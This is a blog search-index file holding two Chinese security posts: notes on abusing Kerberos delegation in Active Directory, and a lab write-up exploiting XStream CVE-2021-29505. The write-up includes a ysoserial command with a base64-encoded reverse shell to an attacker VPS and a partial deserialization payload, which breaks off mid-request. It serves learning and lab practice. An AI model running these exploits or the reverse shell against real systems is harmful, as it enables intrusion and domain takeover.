<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>委派</title>
      <link href="/2025/03/16/%E5%9F%9F/%E5%A7%94%E6%B4%BE/"/>
      <url>/2025/03/16/%E5%9F%9F/%E5%A7%94%E6%B4%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="委派安全知识点"><a href="#委派安全知识点" class="headerlink" title="委派安全知识点"></a>委派安全知识点</h2><p>委派是一种域内应用模式，是指将域内用户账户的权限委派给服务账号，服务账号因此能以用户的身份在域内展开活动（请求新的服务等），类似于租房中介房东的关系去理解。</p><h2 id="域委派分类："><a href="#域委派分类：" class="headerlink" title="域委派分类："></a>域委派分类：</h2><p>1、非约束委派(Unconstrained Delegation, UD)</p><p>2、约束委派(Constrained Delegation, CD)</p><p>3、基于资源的约束委派(Resource Based Constrained Delegation, RBCD)</p><p>简而言之，非约束委派是指用户账户将自身的TGT转发给服务账户使用。约束委派通过S4U2Self和S4U2Proxy两个扩展协议限制服务账户只能访问指定服务资源。</p><p>RBCD主要就是委派的管理移交给服务资源进行控制，其余和约束性委派基本相同。</p><p>账户分类：</p><p>机器账户：计算机本身名称的账户，在域中computers组内的计算机。</p><p>主机账户：计算机系统的主机账户，用于正常用户登入计算机使用。</p><p>服务账户：计算机服务安装时创建的账户，用于运行服务时使用，不可用于登入计算机。</p><p>涉及项目:</p><p><a href="https://github.com/shanfenglan/test/tree/master/spooler">https://github.com/shanfenglan/test/tree/master/spooler</a></p><p><a href="https://github.com/fortra/impacket%EF%BC%88%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%EF%BC%89">https://github.com/fortra/impacket（综合利用）</a></p><p><a href="https://github.com/gentilkiwi/kekeo%EF%BC%88%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%EF%BC%89">https://github.com/gentilkiwi/kekeo（票据利用）</a></p><p><a href="https://github.com/topotam/PetitPotam%EF%BC%88%E7%BB%93%E5%90%88ntlm%E9%87%8D%E6%94%BE%EF%BC%89">https://github.com/topotam/PetitPotam（结合ntlm重放）</a></p><p><a href="https://github.com/leechristensen/SpoolSample%EF%BC%88%E6%89%93%E5%8D%B0%E6%9C%BA%E5%88%A9%E7%94%A8%EF%BC%89">https://github.com/leechristensen/SpoolSample（打印机利用）</a></p><p><a href="https://www.joeware.net/freetools/tools/adfind/(%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)">https://www.joeware.net/freetools/tools/adfind/(信息收集)</a></p><p>参考文章：</p><p><a href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p><p><a href="https://www.cnblogs.com/sup3rman/p/16088447.html">https://www.cnblogs.com/sup3rman/p/16088447.html</a></p><p><a href="https://mp.weixin.qq.com/s/0UOOMF5s00D-y3fojVKMdA">https://mp.weixin.qq.com/s/0UOOMF5s00D-y3fojVKMdA</a></p><h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742997871349-02ffc29c-61f3-4562-ada1-afefee98b189.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">具体认证流程：</span><br><span class="line">1、用户机器向KDC请求可转发的TGT1</span><br><span class="line">2、KDC在消息中给返回TGT1（访问服务1使用）</span><br><span class="line">3、用户通过TGT1请求转发TGT2（访问服务2使用）</span><br><span class="line">4、KDC返回消息TGT2</span><br><span class="line">5、用户使用TGT1向KDC申请访问服务1</span><br><span class="line">6、TGS 返回 ST 给用户</span><br><span class="line">7、用户发送AP_REQ请求服务1，包含了TGT1、TGT2、TGT2的sessionkey</span><br><span class="line">8、服务1使用用户发送过来的TGT2去请求KDC，并以用户的身份请求服务2的ST</span><br><span class="line">9、KDC返回服务2的ST给服务1（这里ST将来源请求标记为用户机器，而不是服务1）</span><br><span class="line">10、服务1以用户的名义请求服务2</span><br><span class="line">11、服务2回应服务1请求</span><br><span class="line">12、服务1回应用户机器请求</span><br><span class="line">13、服务1能够向KDC请求其他服务ST</span><br><span class="line">14、KDC返回其他服务ST</span><br><span class="line">15、服务1以用户名义请求其他服务</span><br><span class="line">16、其他服务回应服务1</span><br></pre></td></tr></table></figure><p>原理：</p><p>机器A（域控）访问具有非约束委派权限的机器B的服务，会把当前认证用户（域管用户）的的TGT放在ST票据中，一起发送给机器B，机器B会把TGT存储在lsass进程中以备下次重用。从而机器B就能使用这个TGT模拟认证用户（域管用户）访问服务。</p><p>利用场景</p><p>攻击者拿到了一台配置非约束委派的机器权限，可以诱导域管来访问该机器，然后得到管理员的TGT，从而模拟域管用户。</p><p>复现配置：</p><p>参考：<a href="https://developer.aliyun.com/article/1228233">https://developer.aliyun.com/article/1228233</a></p><p>1、信任此计算机来委派任何服务</p><p>2、setspn -U -A MSSQLSvc&#x2F;mssql.hack.com:1433 test2</p><p>开启服务账号test2的委派设置：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742998178852-e76c4a8a-d6b7-48ca-ac85-2858cf450339.png"></p><p>设置机器账号为委派：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742998186515-f20ecda0-fe96-4b0a-80bc-ee6da52b958a.png"></p><p><strong>注意：</strong>只有服务账号和主机账号能设置委派</p><p>当设置成功后，账号的userAccountControl属性会包含TRUSTED_FOR_DELEGATION</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742998198922-ab48c74a-38d7-4647-9e44-1d251d31dd50.png"></p><p>判断查询：</p><p>查询域内设置了非约束委派的服务账户：</p><p>AdFind -b “DC&#x3D;god,DC&#x3D;org” -f “(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))” dn</p><p>查询域内设置了非约束委派的机器账户:</p><p>AdFind -b “DC&#x3D;god,DC&#x3D;org” -f “(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))” dn</p><p>利用思路1：诱使域管理员访问机器</p><h3 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h3><p>1、需要Administrator权限</p><p>2、域内主机的机器账户开启非约束委派</p><p>3、域控管理员远程访问（主动或被动）</p><p>利用过程：参考<a href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p><h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><p>原理：</p><p>由于非约束委派的不安全性，微软在windows server 2003中引入了约束委派，对Kerberos协议进行了拓展，引入了SService for User to Self (S4U2Self)和 Service for User to Proxy (S4U2proxy)。</p><p><strong>S4U2self：</strong></p><p>当服务账户开启了约束性委派时，那么该服务就可以代表访问到该服务的用户请求<strong>针对其自身的</strong>服务票据(ST)，也就是说当user1访问到了服务1，服务1以<strong>s4u2self</strong>的方式向KDC请求一张可以<strong>以user1身份</strong>访问自身服务1的、<strong>可用于转发</strong>的票据，实际还是访问的服务1，但是借助了user1的身份，目的就是拿到user1的授权数据，如果user1是以其他认证方式对服务1进行认证的（web、ntlm等），是获取不到访问服务1自身的st票据的，所以s4u2self就是用来解决这个问题的。</p><p><strong>S4U2proxy：</strong></p><p>服务1可以以用户的名义请求其它服务的ST，和self最大的区别就是self是请求自身服务，当需要以user1的身份访问其他服务，就需要<strong>s4u2proxy</strong>上场了，而约束委派就是限制了S4U2proxy扩展的访问范围</p><h3 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742998936926-dea664a1-463a-4462-8ea6-abc7d1a3b853.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">（1）用户向 Service1 发出请求，用户已通过身份验证，但 Service1 没有用户的授权数据，这通常是由于用户的身份验证是通过 Kerberos 以外(基于表单的 web 认证、NTLM 认证等)的其他方式验证的。</span><br><span class="line">（2）Service1 已经通过 KDC 进行了身份验证，并获得了 TGT 认购权证。它通过S4U2self 协议代表用户向 KDC 请求一张访问自身 Service1 服务的可转发 ST 服务票据。</span><br><span class="line">（3）KDC 返回给 Service1 一张访问 Service1 自身服务的可转发 ST1 服务票据，就像是用户使用自己的 TGT 认购权证请求的一样，该可转发的 ST1 服务票据可能包含用户的授权数据。</span><br><span class="line">（4）Service1 可以使用 ST1 服务票据中的授权数据来满足用户的请求，然后响应用户。</span><br><span class="line">（5）用户向 Service1 发出请求，请求访问 Service2 上的资源。</span><br><span class="line">（6）Service1 利用 S4U4Proxy 协议以用户的名义向 KDC 请求访问 Service2 的ST2 服务票据，该请求中带上了可转发的 ST1 服务票据</span><br><span class="line">（7）如果请求中存在 PAC 特权属性证书，则 KDC 通过检查 PAC 结构的签名数据来验证 PAC。如果 PAC 有效或不存在，KDC 返回 Service2 的可转发 ST2 服务票据，并且存储在 ST2 服务票据中的 cname 和 crealm 字段中的客户端标识是用户，而不是 Service1。</span><br><span class="line">（8）Service1 以用户身份使用可转发 ST2 服务票据向 Service2 发起请求。</span><br><span class="line">（9）Service2 响应步骤 8 的请求。</span><br><span class="line">（10）Service1 响应用户对步骤 5 中的请求。</span><br></pre></td></tr></table></figure><p>利用场景：</p><p>如果攻击者控制了服务A的账号，并且服务A配置了到域控的CIFS服务的约束性委派。</p><p>则攻击者可以先使用S4u2seflt申请域管用户（administrator）访问A服务的ST1，然后使用S4u2Proxy以administrator身份访问域控的CIFS服务，即相当于控制了域控。</p><p>复现配置：参考<a href="https://developer.aliyun.com/article/1228237?spm=a2c6h.24874632.expert-profile.7.2fe45662aTMdZv">https://developer.aliyun.com/article/1228237?spm=a2c6h.24874632.expert-profile.7.2fe45662aTMdZv</a></p><p>1、机器设置仅信任此计算机指定服务-cifs</p><p>2、用户设置仅信任此计算机指定服务-cifs</p><p>配置服务账户test2对域控机器PANDA的特定服务cifs的约束性委派</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742998784594-5266472d-648b-4e07-83f9-a39685a757dc.png"></p><p>不过在实际环境中，基本不会有企业会这么配置的，所以约束性委派用的也不是很多</p><p>当服务账号或者主机被设置为约束性委派时，其userAccountControl属性会包含TRUSTED_TO_AUTH_FOR_DELEGATION</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742998805101-338f8b9b-738e-4d89-bdd0-0ad2d3ccee4f.png"></p><p>而且msDS-AllowedToDelegateTo属性会包含被约束的特定服务</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742998814023-301eeb35-5077-42f6-bac3-db827b9374e8.png"></p><p>利用思路：使用机器账户票据</p><h3 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h3><p>kekeo Rubeus getST</p><p>1、需要Administrator权限</p><p>2、目标机器账户配置了约束性委派</p><p>判断查询：</p><p>查询机器用户（主机）配置约束委派</p><p>AdFind -b “DC&#x3D;god,DC&#x3D;org” -f “(&amp;(samAccountType&#x3D;805306369)(msds-allowedtodelegateto&#x3D;*))” msds-allowedtodelegateto</p><p>查询服务账户（主机）配置约束委派</p><p>AdFind -b “DC&#x3D;god,DC&#x3D;org” -f “(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))” msds-allowedtodelegateto</p><p>kekeo利用步骤：参考<a href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p><h2 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h2><p>基于资源的约束委派(RBCD)是在Windows Server 2012中新加入的功能，与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。也就是说机器自身可以直接在自己账户上配置msDS-AllowedToActOnBehalfOfOtherIdentity属性来设置RBCD。</p><p>所以核心就是谁或什么权限能修改msDS-AllowedToActOnBehalfOfOtherIdentity</p><p>简单的讲，也就是如果攻击者能够在data的机器上设置msDS-AllowedToActOnBehalfOfOtherIdentity属性为ServiceA，</p><p>也就允许ServiceA利用s4u2self协议代表其他用户身份来访问data的话，那我们就可以做到横向移动及提权等操作。</p><p>以下这些拥有配置<strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong>属性的权限：1.将某机器加入域的域用户2.机器自身3.域管理员</p><h3 id="流程-2"><a href="#流程-2" class="headerlink" title="流程"></a>流程</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742999993490-1352de6f-4798-41ae-99cb-e29ee1457ccb.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1）服务A使用自己的服务账户和密码向KDC申请一个可转发的TGT</span><br><span class="line">2）服务A利用S4u2Self协议代表用户申请一个访问自身的ST。这一步区别于传统的约束性委派。在S4uSelf协议中提到，返回的ST可转发的一个条件是服务A配置了传统的约束性委派。KDC会检查服务A的msDS-AllowedToDelegateTo字段，如果这个字段被赋值了，则KDC返回可转发的ST。但是由于这里是基于资源的约束性委派，是在服务B上配置的，服务B的msDS-AllowedToActOnBehalfOfOtherIdentity属性配置了服务A的SID，服务A并没有配置msDS-AllowedToDelegateTo字段，因此KDC返回的ST是不可转发的</span><br><span class="line">3）服务A利用S4u2Proxy协议以用户身份向KDC请求访问服务B的可转发ST（上一步获得的不可转发ST放在请求包的AddtionTicket中）。KDC返回访问服务B的可转发ST。</span><br><span class="line">4）服务A用上一步获得可转发ST访问服务B</span><br></pre></td></tr></table></figure><p>我们可以利用<strong>域用户</strong>添加一个<strong>机器账户</strong>作为服务1，注意是机器账户，不是普通账户，普通账户没有SPN，因为S4U2self协议会用到SPN，而且通过S4U2Self得到的ST服务票证是<strong>不可被转发</strong>的，而S4U2Proxy的作用就是将可转发的ST票据转发到其他服务进行委派认证的，但是在基于资源的约束委派过程中，不可转发的ST仍可以通过S4U2Proxy转发到其他服务进行委派认证，并且最后还会返回一张可转发的ST服务票证，如果我们可以在服务2上配置允许服务1的资源约束委派，就可以通过服务1利用S4U2self向KDC请求用于访问自身的票据，在使用S4U2Proxy转发此票据去请求访问服务2的票据，最终就可以模拟任何用户去访问服务2了</p><p>通过资源约束委派可以通过普通域用户权限以管理员的身份去访问特定主机的服务(cifs等)，可以实现本地权限提升，但是不能完全具有域管的所有权限(如进行dcsync等)，或者利用资源约束委派横向拿下所有被该普通域用户拉进域内的机器权限</p><p>复现配置：参考<a href="https://developer.aliyun.com/article/1228243?spm=a2c6h.24874632.expert-profile.6.2fe45662aTMdZv">https://developer.aliyun.com/article/1228243?spm=a2c6h.24874632.expert-profile.6.2fe45662aTMdZv</a></p><p>用一个域用户test2将机器加入域中</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742999430332-a17c569a-b930-4f65-8b0b-5d58b9465627.png"></p><p>去查看机器用户的mS-DS-CreatorSID属性，域用户拉进来的都有这个属性，如果没有说明是被域管理员拉进来到域内中的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742999447984-aeb2d36a-512f-4120-9db2-77b5a9523dc4.png"></p><h3 id="利用条件：-2"><a href="#利用条件：-2" class="headerlink" title="利用条件："></a>利用条件：</h3><p>1.机器账户：是由某个域用户创建的主机，只要拿下这个域账户，那么就能拿下这个域用户所创建的所有机器账户的最高权限（默认每个域用户能创10个机器账户）</p><p>2.拥有一个有权修改msDS-AllowedToActOnBehalfOfOtherIdentity属性的域用户账号密码(将机器拉进域的域用户)、或者在<strong>account operators</strong>组内的域用户</p><p>3.域控需要是server2012和2012 R2以上的（因为2008及以下没有msDS-AllowedToActOnBehalfOfOtherIdentity属性）</p><p>4.任意用户对该主机的属性具有写权限，那么这个用户就可以对该主机进行攻击，所以可以枚举域内ACL策略，查看哪些对主机有GenericAll权限，GenericWrite、WriteProperty、WriteDacl等等权限，都是可以的</p><p>判断是否有利用条件：</p><p>查询被域用户创建的机器账户列表:</p><p>shell AdFind.exe -b “DC&#x3D;xiaodi,DC&#x3D;local” -f “(&amp;(samAccountType&#x3D;805306369))” cn mS-DS-CreatorSID</p><p>根据查询出来的sid找出对应的用户名：</p><p>shell AdFind.exe -b “DC&#x3D;xiaodi,DC&#x3D;local” -f “(&amp;(objectsid&#x3D;S-1-5-21-1695257952-3088263962-2055235443-1104))” objectclass cn dn</p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Delivery</title>
      <link href="/2025/03/13/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Delivery/"/>
      <url>/2025/03/13/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Delivery/</url>
      
        <content type="html"><![CDATA[<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>fscan扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">./fscan_mac -h 39.99.133.230</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">39.99.133.230:21 open</span><br><span class="line">39.99.133.230:80 open</span><br><span class="line">39.99.133.230:22 open</span><br><span class="line">39.99.133.230:8080 open</span><br><span class="line">[*] alive ports len is: 4</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.99.133.230      code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] WebTitle http://39.99.133.230:8080 code:200 len:3655   title:公司发货单</span><br><span class="line">[+] ftp 39.99.133.230:21:anonymous</span><br><span class="line">   [-&gt;]1.txt</span><br><span class="line">   [-&gt;]pom.xml</span><br><span class="line">已完成 4/4</span><br><span class="line">[*] 扫描结束,耗时: 13.720528092s</span><br></pre></td></tr></table></figure><p>扫到ftp匿名登录,ftp上有pom文件</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743074820228-b36de156-1899-48a2-acd8-db33a2e645cb.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.7.2&lt;/version&gt;</span><br><span class="line">        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;</span><br><span class="line">    &lt;/parent&gt;</span><br><span class="line">    &lt;groupId&gt;com.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;ezjava&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;name&gt;ezjava&lt;/name&gt;</span><br><span class="line">    &lt;description&gt;ezjava&lt;/description&gt;</span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;java.version&gt;1.8&lt;/java.version&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">            &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;xstream&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.4.16&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure><p>定位到xstream，有cve</p><h2 id="CVE-2021-29505"><a href="#CVE-2021-29505" class="headerlink" title="CVE-2021-29505"></a>CVE-2021-29505</h2><p><a href="https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md</a></p><p>vps用JRMPListener启动一个恶意的RMI Registry</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUueHgueHgueHgvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p>接着监听一下弹shell的端口，然后向网站传poc，我这里用的9999</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">POST /just_sumbit_it HTTP/1.1</span><br><span class="line">Host: 39.99.133.230:8080</span><br><span class="line">Content-Length: 105</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span><br><span class="line">Accept: application/xml, text/xml, */*; q=0.01</span><br><span class="line">Content-Type: application/xml;charset=UTF-8</span><br><span class="line">Origin: http://39.99.133.230:8080</span><br><span class="line">Referer: http://39.99.133.230:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">    &lt;unserializable-parents/&gt;</span><br><span class="line">    &lt;java.util.PriorityQueue&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">            &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">        &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">                &lt;m__obj class=&#x27;string&#x27;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content&lt;/m__obj&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">                    